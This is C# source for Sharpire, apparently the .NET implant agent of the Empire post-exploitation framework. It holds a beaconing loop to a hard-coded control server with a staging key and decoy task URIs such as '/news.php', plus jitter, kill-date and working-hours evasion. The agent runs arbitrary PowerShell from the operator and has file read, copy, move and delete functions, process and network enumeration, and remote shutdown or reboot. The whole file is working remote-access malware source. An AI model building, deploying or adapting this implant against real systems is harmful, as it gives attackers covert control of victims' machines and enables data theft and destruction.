// Original Author: 0xbadjuju (https://github.com/0xbadjuju/Sharpire)
// Updated and Modified by: Jake Krasnov (@_Hubbl3)
// Project: Empire (https://github.com/BC-SECURITY/Empire)

using System;
using System.Collections.Generic;
using System.Collections.ObjectModel;
using System.IO;
using System.Linq;
using System.Management;
using System.Management.Automation;
using System.Management.Automation.Runspaces;
using System.Net;
using System.Runtime.InteropServices;
using System.Security.Principal;
using System.Text;
using System.Threading;
using System.Text.RegularExpressions;

namespace Sharpire
{
    class Agent
    {
        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool IsWow64Process([In] IntPtr process, [Out] out bool wow64Process);

        private byte[] packets;
        
        public SessionInfo sessionInfo;
        private Coms coms;
        private JobTracking jobTracking;

        ////////////////////////////////////////////////////////////////////////////////
        //
        ////////////////////////////////////////////////////////////////////////////////
        public Agent(SessionInfo sessionInfo)
        {

            this.sessionInfo = sessionInfo;
            coms = new Coms(sessionInfo);
            jobTracking = new JobTracking();
        }

        ////////////////////////////////////////////////////////////////////////////////
        public void Execute()
        {
            while (true)
            {
                Run();
            }
        }

        ////////////////////////////////////////////////////////////////////////////////
        ////////////////////////////////////////////////////////////////////////////////
        internal Coms GetComs()
        {
            return coms;
        }

        ////////////////////////////////////////////////////////////////////////////////
        // Main Loop
        ////////////////////////////////////////////////////////////////////////////////
        private void Run()
        {
            ////////////////////////////////////////////////////////////////////////////////
            if (sessionInfo.GetKillDate().CompareTo(DateTime.Now) > 0 || coms.MissedCheckins > sessionInfo.GetDefaultLostLimit())
            {
                jobTracking.CheckAgentJobs(ref packets, ref coms);

                if (packets.Length > 0)
                {
                    coms.SendMessage(packets);
                }

                string message = "";
                if(sessionInfo.GetKillDate().CompareTo(DateTime.Now) > 0)
                {
                    message = "[!] Agent " + sessionInfo.GetAgentID() + " exiting: past killdate";
                }
                else
                {
                    message = "[!] Agent " + sessionInfo.GetAgentID() + " exiting: Lost limit reached";
                }

                ushort result = 0;
                coms.SendMessage(coms.EncodePacket(2, message, result));
                Environment.Exit(1);
            }

            ////////////////////////////////////////////////////////////////////////////////
            
            if (null != sessionInfo.GetWorkingHoursStart() && null != sessionInfo.GetWorkingHoursEnd())
            {
                DateTime now = DateTime.Now;

                if ((sessionInfo.GetWorkingHoursEnd() - sessionInfo.GetWorkingHoursStart()).Hours < 0)
                {
                    sessionInfo.SetWorkingHoursStart(sessionInfo.GetWorkingHoursStart().AddDays(-1));
                }

                if (now.CompareTo(sessionInfo.GetWorkingHoursStart()) > 0 
                    && now.CompareTo(sessionInfo.GetWorkingHoursEnd()) < 0)
                {
                    TimeSpan sleep = sessionInfo.GetWorkingHoursStart().Subtract(now);
                    if (sleep.CompareTo(0) < 0)
                    {
                        sleep = (sessionInfo.GetWorkingHoursStart().AddDays(1) - now);
                    }
                    Thread.Sleep((int)sleep.TotalMilliseconds);
                }
            }

            ////////////////////////////////////////////////////////////////////////////////
            if (0 != sessionInfo.GetDefaultDelay())
            {
                int max = (int)((sessionInfo.GetDefaultJitter() + 1) * sessionInfo.GetDefaultDelay());
                if (max > int.MaxValue)
                {
                    max = int.MaxValue - 1;
                }

                int min = (int)((sessionInfo.GetDefaultJitter() - 1) * sessionInfo.GetDefaultDelay());
                if (min < 0)
                {
                    min = 0;
                }

                int sleepTime;
                if (min == max)
                {
                    sleepTime = min;
                }
                else
                {
                    Random random = new Random();
                    sleepTime = random.Next(min, max);
                }

                Thread.Sleep(sleepTime * 1000);
            }

            ////////////////////////////////////////////////////////////////////////////////
            byte[] jobResults = jobTracking.GetAgentJobsOutput(ref coms);
            if (0 < jobResults.Length)
            {
                coms.SendMessage(jobResults);
            }

            ////////////////////////////////////////////////////////////////////////////////
            byte[] taskData = coms.GetTask();
            if (taskData.Length > 0)
            {
                coms.MissedCheckins = 0;
                if (String.Empty != Encoding.UTF8.GetString(taskData))
                {
                    coms.DecodeRoutingPacket(taskData, ref jobTracking);
                }
            }
            GC.Collect();
        }

        ////////////////////////////////////////////////////////////////////////////////
        internal static byte[] GetFilePart(string file, int index, int chunkSize)
        {
            byte[] output = new byte[0];
            try
            {
                //Don't shoot the translator, please
                FileInfo fileInfo = new FileInfo(file);
                using (FileStream fileStream = File.OpenRead(file))
                {
                    if (fileInfo.Length < chunkSize)
                    {
                        if (index == 0)
                        {
                            output = new byte[fileInfo.Length];
                            fileStream.Read(output, 0, output.Length);
                            return output;
                        }
                        else
                        {
                            return output;
                        }
                    }
                    else
                    {
                        output = new byte[chunkSize];
                        int start = index * chunkSize;
                        fileStream.Seek(start, 0);
                        int count = fileStream.Read(output, 0, output.Length);
                        if (count > 0)
                        {
                            if (count != chunkSize)
                            {
                                byte[] output2 = new byte[count];
                                Array.Copy(output, output2, count);
                                return output2;
                            }
                            else
                            {
                                return output;
                            }
                        }
                        else
                        {
                            return output;
                        }
                    }
                }
            }
            catch
            {
                return output;
            }
        }

        ////////////////////////////////////////////////////////////////////////////////
        // Almost Done - Finish move copy delete
        ////////////////////////////////////////////////////////////////////////////////
        internal static string InvokeShellCommand(string command, string arguments)
        {
            if (arguments.Contains("*\"\\\\*"))
            {
                arguments = arguments.Replace("\"\\\\","FileSystem::\"\\\\");
            }
            else if (arguments.Contains("*\\\\*")) 
            {
                arguments = arguments.Replace("\\\\", "FileSystem::\\");
            }
            string output = "";
            //This is mostly dead code consider removing in the future
            if (command.ToLower() == "shell")
            {
                if (command.Length > 0)
                {
                    output = RunPowerShell(arguments);
                }
                else
                {
                    output = "no shell command supplied";
                }
                output += "\n\r";
            }
            else
            {
                if (command == "ls" || command == "dir" || command == "gci")
                {
                    output = GetChildItem(arguments);
                }
                else if (command == "mv" || command == "move")
                {
                    Console.WriteLine(arguments);
                    string[] parts = arguments.Split(' ');
                    if (2 != parts.Length)
                        return "Invalid mv|move command";
                    MoveFile(parts.FirstOrDefault(), parts.LastOrDefault());
                    output = "[+] Executed " + command + " " + arguments;
                }
                else if (command == "cp" || command == "copy")
                {
                    string[] parts = arguments.Split(' ');
                    if (2 != parts.Length)
                        return "Invalid cp|copy command";
                    CopyFile(parts.FirstOrDefault(), parts.LastOrDefault());
                    output = "[+] Executed " + command + " " + arguments;
                }
                else if (command == "rm" || command == "del" || command == "rmdir")
                {
                    DeleteFile(arguments);
                    output = "[+] Executed " + command + " " + arguments;
                }
                else if (command == "cd")
                {
                    Directory.SetCurrentDirectory(arguments);
                }
                else if (command == "ifconfig" || command == "ipconfig")
                {
                    output = Ifconfig();
                }
                else if (command == "ps" || command == "tasklist")
                {
                    output = Tasklist(arguments);
                }
                else if (command == "route")
                {
                    output = Route(arguments);
                }
                else if (command == "whoami" || command == "getuid")
                {
                    output = WindowsIdentity.GetCurrent().Name;
                }
                else if (command == "hostname")
                {
                    output = Dns.GetHostName();
                }
                else if (command == "reboot" || command == "restart")
                {
                    Shutdown("2");
                }
                else if (command == "shutdown")
                {
                    Shutdown("5");
                }
                else
                {
                    output = RunPowerShell(command + " " + arguments);
                }
            }
            return output;
        }

        ////////////////////////////////////////////////////////////////////////////////
        // Working
        ////////////////////////////////////////////////////////////////////////////////
        private static void Shutdown(string flags)
        {
            ManagementClass managementClass = new ManagementClass("Win32_OperatingSystem");
            managementClass.Get();

            managementClass.Scope.Options.EnablePrivileges = true;
            ManagementBaseObject managementBaseObject = managementClass.GetMethodParameters("Win32Shutdown");

            // Flag 1 means we want to shut down the system. Use "2" to reboot.
            managementBaseObject["Flags"] = flags;
            managementBaseObject["Reserved"] = "0";
            foreach (ManagementObject managementObject in managementClass.GetInstances())
            {
                managementObject.InvokeMethod("Win32Shutdown", managementBaseObject, null);
            }
        }

        ////////////////////////////////////////////////////////////////////////////////
        // Working
        ////////////////////////////////////////////////////////////////////////////////
        private static string Route(string arguments)
        {
            Dictionary<uint, string> adapters = new Dictionary<uint, string>();
            ManagementScope scope = new ManagementScope("\\\\.\\root\\cimv2");
            scope.Connect();
            ObjectQuery query = new ObjectQuery("SELECT * FROM Win32_NetworkAdapterConfiguration");
            ManagementObjectSearcher objectSearcher = new ManagementObjectSearcher(scope, query);
            ManagementObjectCollection objectCollection = objectSearcher.Get();
            foreach (ManagementObject managementObject in objectCollection)
            {
                adapters[(uint)managementObject["InterfaceIndex"]] = ManagementObjectToString((string[])managementObject["IPAddress"]);
            }

            List<string> lines = new List<string>();
            ObjectQuery query2 = new ObjectQuery("SELECT * FROM Win32_IP4RouteTable ");
            ManagementObjectSearcher objectSearcher2 = new ManagementObjectSearcher(scope, query2);
            ManagementObjectCollection objectCollection2 = objectSearcher2.Get();
            foreach (ManagementObject managementObject in objectCollection2)
            {
                string destination = "";
                if (managementObject["Destination"] != null)
                {
                    destination = (string)managementObject["Destination"];
                }

                string netmask = "";
                if (managementObject["Mask"] != null)
                {
                    netmask = (string)managementObject["Mask"];
                }

                string nextHop = "0.0.0.0";
                if ((string)managementObject["NextHop"] != "0.0.0.0")
                {
                    nextHop = (string)managementObject["NextHop"];
                }

                int index = (int)managementObject["InterfaceIndex"];

                string adapter = "";
                if (!adapters.TryGetValue((uint)index, out adapter))
                {
                    adapter = "127.0.0.1";
                }

                string metric = Convert.ToString((int)managementObject["Metric1"]);

                lines.Add(
                    string.Format("{0,-17} : {1,-50}\n", "Destination", destination) +
                    string.Format("{0,-17} : {1,-50}\n", "Netmask", netmask) +
                    string.Format("{0,-17} : {1,-50}\n", "NextHop", nextHop) +
                    string.Format("{0,-17} : {1,-50}\n", "Interface", adapter) +
                    string.Format("{0,-17} : {1,-50}\n", "Metric", metric)    
                );

            }
            return string.Join("\n", lines.ToArray());
        }

        ////////////////////////////////////////////////////////////////////////////////
        // Working
        ////////////////////////////////////////////////////////////////////////////////
        private static string Tasklist(string arguments)
        {
            Dictionary<int, string> owners = new Dictionary<int, string>();
            ManagementScope scope = new ManagementScope("\\\\.\\root\\cimv2");
            scope.Connect();
            ObjectQuery query = new ObjectQuery("SELECT * FROM Win32_Process");
            ManagementObjectSearcher objectSearcher = new ManagementObjectSearcher(scope, query);
            ManagementObjectCollection objectCollection = objectSearcher.Get();
            foreach (ManagementObject managementObject in objectCollection)
            {
                string name = "";
                string[] owner = new string[2];
                managementObject.InvokeMethod("GetOwner", (object[]) owner);
                if (owner[0] != null)
                {
                    name = owner[1] + "\\" + owner[0];
                }
                else
                {
                    name = "N/A";
                }
                managementObject.InvokeMethod("GetOwner", (object[]) owner);
                owners[Convert.ToInt32(managementObject["Handle"])] = name;
            }

            List<string[]> lines = new List<string[]>();
            System.Diagnostics.Process[] processes = System.Diagnostics.Process.GetProcesses();
            foreach (System.Diagnostics.Process process in processes)
            {
                string architecture;
                int workingSet;
                bool isWow64Process;
                try
                {
                    IsWow64Process(process.Handle, out isWow64Process);
                    if (isWow64Process)
                    {
                        architecture = "x64";
                    }
                    else
                    {
                        architecture = "x86";
                    }
                }
                catch
                {
                    architecture = "N/A";
                }
                workingSet = (int)(process.WorkingSet64 / 1000000);

                string userName = "";
                try
                {
                    if (!owners.TryGetValue(process.Id, out userName))
                    {
                        userName = "False";
                    }
                }
                catch
                {
                    userName = "Catch";
                }

                lines.Add(
                    new string[] {process.ProcessName,
                        process.Id.ToString(),
                        architecture,
                        userName,
                        Convert.ToString(workingSet)
                    }
                );

            }

            string[][] linesArray = lines.ToArray();

            //https://stackoverflow.com/questions/232395/how-do-i-sort-a-two-dimensional-array-in-c
            Comparer<int> comparer = Comparer<int>.Default;
            Array.Sort<String[]>(linesArray, (x, y) => comparer.Compare(Convert.ToInt32(x[1]), Convert.ToInt32(y[1])));
            
            List<string> sortedLines = new List<string>();
            string[] headerArray = {"ProcessName", "PID", "Arch", "UserName", "MemUsage"};
            sortedLines.Add(string.Format("{0,-30} {1,-8} {2,-6} {3,-28} {4,8}", headerArray));
            foreach (string[] line in linesArray)
            {
                sortedLines.Add(string.Format("{0,-30} {1,-8} {2,-6} {3,-28} {4,8} M", line));
            }
            return string.Join("\n", sortedLines.ToArray());
        } 

        ////////////////////////////////////////////////////////////////////////////////
        // Working
        ////////////////////////////////////////////////////////////////////////////////
        private static string Ifconfig()
        {
            ManagementScope scope = new ManagementScope("\\\\.\\root\\cimv2");
            scope.Connect();
            ObjectQuery query = new ObjectQuery("SELECT * FROM Win32_NetworkAdapterConfiguration");
            ManagementObjectSearcher objectSearcher = new ManagementObjectSearcher(scope, query);
            ManagementObjectCollection objectCollection = objectSearcher.Get();
            List<string> lines = new List<string>();
            foreach (ManagementObject managementObject in objectCollection)
            {
                if ((bool)managementObject["IPEnabled"] == true)
                {
                    lines.Add(
                        string.Format("{0,-17} : {1,-50}\n", "Description", managementObject["Description"]) +
                        string.Format("{0,-17} : {1,-50}\n", "MACAddress", managementObject["MACAddress"]) +
                        string.Format("{0,-17} : {1,-50}\n", "DHCPEnabled", managementObject["DHCPEnabled"]) +
                        string.Format("{0,-17} : {1,-50}\n", "IPAddress", ManagementObjectToString((string[])managementObject["IPAddress"])) +
                        string.Format("{0,-17} : {1,-50}\n", "IPSubnet", ManagementObjectToString((string[])managementObject["IPSubnet"])) +
                        string.Format("{0,-17} : {1,-50}\n", "DefaultIPGateway", ManagementObjectToString((string[])managementObject["DefaultIPGateway"])) +
                        string.Format("{0,-17} : {1,-50}\n", "DNSServer", ManagementObjectToString((string[])managementObject["DNSServerSearchOrder"])) +
                        string.Format("{0,-17} : {1,-50}\n", "DNSHostName", managementObject["DNSHostName"]) +
                        string.Format("{0,-17} : {1,-50}\n", "DNSSuffix", ManagementObjectToString((string[])managementObject["DNSDomainSuffixSearchOrder"]))
                    );
                }
            }
            return string.Join("\n", lines.ToArray());
        }

        ////////////////////////////////////////////////////////////////////////////////
        ////////////////////////////////////////////////////////////////////////////////
        private static void DeleteFile(string sourceFile)
        {
            if (IsFile(sourceFile))
                File.Delete(sourceFile);
            else
                Directory.Delete(sourceFile, true);
        }

        ////////////////////////////////////////////////////////////////////////////////
        ////////////////////////////////////////////////////////////////////////////////
        private static void CopyFile(string sourceFile, string destinationFile)
        {
            if (IsFile(sourceFile))
            {
                File.Copy(sourceFile, destinationFile);
            }
            else
            {
                //https://stackoverflow.com/questions/58744/copy-the-entire-contents-of-a-directory-in-c-sharp
                foreach (string dirPath in Directory.GetDirectories(sourceFile, "*", SearchOption.AllDirectories))
                {
                    Directory.CreateDirectory(dirPath.Replace(sourceFile, destinationFile));
                }

                foreach (string newPath in Directory.GetFiles(sourceFile, "*.*", SearchOption.AllDirectories))
                {
                    File.Copy(newPath, newPath.Replace(sourceFile, destinationFile), true);
                }
            }
        }

        ////////////////////////////////////////////////////////////////////////////////
        ////////////////////////////////////////////////////////////////////////////////
        private static void MoveFile(string sourceFile, string destinationFile)
        {
            if (IsFile(sourceFile))
                File.Move(sourceFile, destinationFile);
            else
                Directory.Move(sourceFile, destinationFile);
        }

        ////////////////////////////////////////////////////////////////////////////////
        ////////////////////////////////////////////////////////////////////////////////
        private static bool IsFile(string filePath)
        {
            FileAttributes fileAttributes = File.GetAttributes(filePath);
            return (fileAttributes & FileAttributes.Directory) == FileAttributes.Directory ? false : true;
        }

        ////////////////////////////////////////////////////////////////////////////////
        // Working
        ////////////////////////////////////////////////////////////////////////////////
        private static string ManagementObjectToString(string[] managementObject)
        {
            string output;
            if (managementObject != null && managementObject.Length > 0)
            {
                output = string.Join(", ", managementObject);
            }
            else
            {
                output = " ";
            }
            return output;
        }

        ////////////////////////////////////////////////////////////////////////////////
        // Working
        ////////////////////////////////////////////////////////////////////////////////
        private static string GetChildItem(string folder)
        {
            if (folder == "")
            {
                folder = ".";
            }

            try
            {
                List<string> lines = new List<string>();
                DirectoryInfo directoryInfo = new DirectoryInfo(folder);
                FileInfo[] files = directoryInfo.GetFiles();
                foreach (FileInfo file in files)
                {
                    lines.Add(file.ToString());
                    //output += Directory.GetLastWriteTime(file.FullName) + "\t";
                    //output += file.Length + "\t";
                    //output += file.Name + "\n\r";
                }
                return string.Join("\n", lines.ToArray());
            }
            catch (Exception error)
            {
                return "[!] Error: " + error + " (or cannot be accessed).";
            }
        }

        ////////////////////////////////////////////////////////////////////////////////
        // Working
        ////////////////////////////////////////////////////////////////////////////////
        internal static string RunPowerShell(string command)
        {
            using (Runspace runspace = RunspaceFactory.CreateRunspace())
            {
                runspace.Open();

                using (Pipeline pipeline = runspace.CreatePipeline())
                {
                    pipeline.Commands.AddScript(command);
                    pipeline.Commands.Add("Out-String");

                    StringBuilder sb = new StringBuilder();
                    try
                    {
                        Collection<PSObject> results = pipeline.Invoke();
                        foreach (PSObject obj in results)
                        {
                            sb.Append(obj.ToString());
                        }
                    }
                    catch (ParameterBindingException error)
                    {
                        sb.Append("[-] ParameterBindingException: " + error.Message);
                    }                    
                    catch (CmdletInvocationException error)
                    {
                        sb.Append("[-] CmdletInvocationException: " + error.Message);
                    }
                    catch (RuntimeException error)
                    {
                        sb.Append("[-] RuntimeException: " + error.Message);
                    }

                    return sb.ToString();
                }
            }
        }
    }
    
    sealed class SessionInfo
    {
        private string[] ControlServers;
        private readonly string StagingKey;
        private byte[] StagingKeyBytes;
        private readonly string AgentLanguage;

        private string[] TaskURIs;
        private string UserAgent;
        private double DefaultJitter;
        private uint DefaultDelay;
        private uint DefaultLostLimit;

        private string StagerUserAgent;
        private string StagerURI;
        private string Proxy;
        private string ProxyCreds;
        private DateTime KillDate;
        private DateTime WorkingHoursStart;
        private DateTime WorkingHoursEnd;
        private string AgentID;
        private string SessionKey;
        private byte[] SessionKeyBytes;

        public SessionInfo()
        {
            //These settings will be the overwritten inputs for compilation 
            ControlServers = new String[] { "http://192.168.219.128" };
            StagingKey = "a#)JF=z_K%7S.1,-Ou{w+j9M&bcmflI4";
            AgentLanguage = "dotnet";

            SetDefaults();
        }

        public SessionInfo(string[] args)
        {
            ControlServers = args[0].Split(new String[] { "," }, StringSplitOptions.RemoveEmptyEntries);
            Console.WriteLine(args[1]);
            StagingKey = args[1];
            AgentLanguage = args[2];

            SetDefaults();
        }

        private void SetDefaults()
        {
            StagingKeyBytes = System.Text.Encoding.ASCII.GetBytes(StagingKey);
            TaskURIs = new string[] { "/admin/get.php","/news.php","/login/process.php" };
            UserAgent = "(Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko";
            double DefaultJitter = 0.0;
            uint DefaultDelay = 5;
            uint DefaultLostLimit = 60;

            StagerUserAgent = "";
            if (string.IsNullOrEmpty(StagerUserAgent))
            {
                StagerUserAgent = UserAgent;
            }
            StagerURI = "";
            Proxy = "default";
            ProxyCreds = "";

            string KillDate = "";
            if (!string.IsNullOrEmpty(KillDate))
            {
                Regex regex = new Regex("^\\d{1,2}\\/\\d{1,2}\\/\\d{4}$");

                if (regex.Match(KillDate).Success)
                    DateTime.TryParse(KillDate, out this.KillDate);
            }

            string WorkingHours = "";
            if (!string.IsNullOrEmpty(WorkingHours))
            {
                Regex regex = new Regex("^[0-9]{1,2}:[0-5][0-9]$");

                string start = WorkingHours.Split(',').First();
                if (regex.Match(start).Success)
                    DateTime.TryParse(start, out WorkingHoursStart);

                string end = WorkingHours.Split(',').Last();
                if (regex.Match(end).Success)
                    DateTime.TryParse(end, out WorkingHoursEnd);
            }
        }

        public string[] GetControlServers() { return ControlServers; }
        public string GetStagingKey() { return StagingKey; }
        public byte[] GetStagingKeyBytes() { return StagingKeyBytes; }
        public string GetAgentLanguage() { return AgentLanguage; }

        public string[] GetTaskURIs() { return TaskURIs; }
        public string GetUserAgent() { return UserAgent; }
        public double GetDefaultJitter() { return DefaultJitter; }
        public void SetDefaultJitter(double DefaultJitter)
        {
            this.DefaultJitter = DefaultJitter;
        }
        public uint GetDefaultDelay() { return DefaultDelay; }
        public void SetDefaultDelay(uint DefaultDelay)
        {
            this.DefaultDelay = DefaultDelay;
        }
        public uint GetDefaultLostLimit() { return DefaultLostLimit; }
        public void SetDefaultLostLimit(uint DefaultLostLimit)
        {
            this.DefaultLostLimit = DefaultLostLimit;
        }

        public string GetStagerUserAgent() { return StagerUserAgent; }
        public string GetStagerURI() { return StagerURI; }
        public string GetProxy() { return Proxy; }
        public string GetProxyCreds() { return ProxyCreds; }
        public DateTime GetKillDate() { return KillDate; }

        public void setProfile(string profile)
        {
            this.TaskURIs = profile.Split('|').First().Split(',');
            this.UserAgent = profile.Split('|').Last();
        }
        public void SetKillDate(string KillDate)
        {
            Regex regex = new Regex("^\\d{1,2}\\/\\d{1,2}\\/\\d{4}$");

            if (regex.Match(KillDate).Success)
                DateTime.TryParse(KillDate, out this.KillDate);
        }
        public void SetWorkingHoursStart(DateTime WorkingHoursStart)
        {
            this.WorkingHoursStart = WorkingHoursStart;
        }
        public void SetWorkingHours(string WorkingHours)
        {
            Regex regex = new Regex("^[0-9]{1,2}:[0-5][0-9]$");

            string start = WorkingHours.Split('-').First();
            if (regex.Match(start).Success)
                DateTime.TryParse(start, out this.WorkingHoursStart);

            string end = WorkingHours.Split('-').Last();
            if (regex.Match(end).Success)
                DateTime.TryParse(end, out this.WorkingHoursEnd);
        }
        public DateTime GetWorkingHoursStart() { return WorkingHoursStart; }
        public DateTime GetWorkingHoursEnd() { return WorkingHoursEnd; }

        public void SetAgentID(string AgentID) { this.AgentID = AgentID; }
        public string GetAgentID() { return AgentID; }

        public void SetSessionKey(string SessionKey)
        {
            this.SessionKey = SessionKey;
            SessionKeyBytes = System.Text.Encoding.ASCII.GetBytes(SessionKey);
        }
        public string GetSessionKey() { return SessionKey; }
        public byte[] GetSessionKeyBytes() { return SessionKeyBytes; }
    }
}